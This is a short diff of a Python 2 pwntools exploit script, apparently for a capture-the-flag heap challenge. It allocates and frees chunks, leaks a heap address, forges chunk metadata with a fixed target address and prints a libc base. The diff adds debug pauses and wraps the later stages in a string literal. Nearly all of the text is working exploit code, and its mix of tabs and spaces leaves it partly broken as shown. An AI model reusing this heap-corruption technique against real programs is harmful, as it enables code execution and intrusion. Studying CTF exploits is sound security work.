@@ -70,13 +70,15 @@ def main():
 
 	create(0, 0x20, "")
 	create(1, 0x20, "")	
-	delete(1)
+        delete(1)
 	delete(0)
         pid=util.proc.pidof(r)[0]
         raw_input("[DEBUG] %d" % pid)
 	create(0, 0x20, "")
 	leak_heap=u64(edit("")[:-1].ljust(8,"\x00"))
 	log.info("Heap: 0x{:0x}" .format(leak_heap))
+	raw_input("[DEBUG]")
+        '''
 	change("AAAA", p64(0) + p64(0x31) + p64(0)*2 + "\xfc")
 	edit(p64(0)*5 + p64(0x31) + p64(0x602a40))
 	create(1, 0x20, "")
@@ -94,7 +96,7 @@ def main():
 	
 	print "[+] libc 0x%x" % p_libc
 	raw_input("[DEBUG]")
-
+        '''
 if __name__ == '__main__':
 	main()
 
